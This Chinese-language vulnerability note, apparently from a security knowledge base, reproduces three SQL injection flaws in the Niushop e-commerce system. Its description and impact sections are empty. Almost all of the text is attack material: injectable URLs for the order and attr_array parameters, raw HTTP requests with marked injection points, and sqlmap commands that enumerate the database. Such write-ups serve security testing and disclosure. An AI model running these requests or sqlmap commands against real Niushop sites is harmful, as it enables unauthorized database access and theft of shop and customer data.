Niushop sql注入
===============

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

### sql注入（一）

#### order参数：

    http://0-sec.org/index.php/wap/goods/getGoodsListByConditions?category_id=1&brand_id=2&min_price=3&max_price=4&page=5&page_size=6&order=7%27&attr_array[][2]=8&spec_array[]=9

#### attr\_array参数：

    http://0-sec.org/index.php/wap/goods/getGoodsListByConditions?category_id=1&brand_id=2&min_price=3&max_price=4&page=5&page_size=6&order=7&attr_array[][2]=8%27&spec_array[]=9

#### 直接上sqlmap

    sqlmap -u "http://0-sec.org/index.php/wap/goods/getGoodsListByConditions?category_id=1&brand_id=2&min_price=3&max_price=4&page=5&page_size=6&order=7&attr_array[][2]=8*&spec_array[]=9" --random-agent --batch --dbms "mysql"
    sqlmap -u "http://0-sec.org/index.php/wap/goods/getGoodsListByConditions?category_id=1&brand_id=2&min_price=3&max_price=4&page=5&page_size=6&order=7&attr_array[][2]=8*&spec_array[]=9" --random-agent --batch --dbms "mysql" --current-db

### sql注入（二）

    GET /index.php?s=/wap/Goods/promotionZone&group_id=*&page=1 HTTP/1.1
    Host: 0-sec.org
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://172.16.209.129:8085/index.php/wap/goods/promotionZone
    X-Requested-With: XMLHttpRequest
    Cookie: PHPSESSID=uolpfnofnhcmdnamo55d883bk4; admin_type=1; workspaceParamSupplier=index%7CGoods; CNZZDATA009=30037667-1536735
    Connection: close

将数据包保存为niushop.txt

    sqlmap -r niushop.txt  --random-agent --batch --dbms "mysql"

### sql注入（三）

    POST /index.php?s=/wap/Goods/goodsSearchList HTTP/1.1
    Host: 0-sec.org
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://172.16.209.129:8086/index.php/wap/goods/goodsSearchList
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Content-Length: 66
    Cookie: PHPSESSID=uolpfnofnhcmdnamo55d883bk4; admin_type=1; workspaceParamSupplier=index%7CGoods; CNZZDATA009=30037667-1536735
    Connection: close
    Cache-Control: max-age=0

    sear_name=&sear_type=1&order=*&sort=asc&controlType=&shop_id=0&page=1

数据包保存为niushop.txt

    sqlmap -r niushop.txt  --random-agent --batch --dbms "mysql
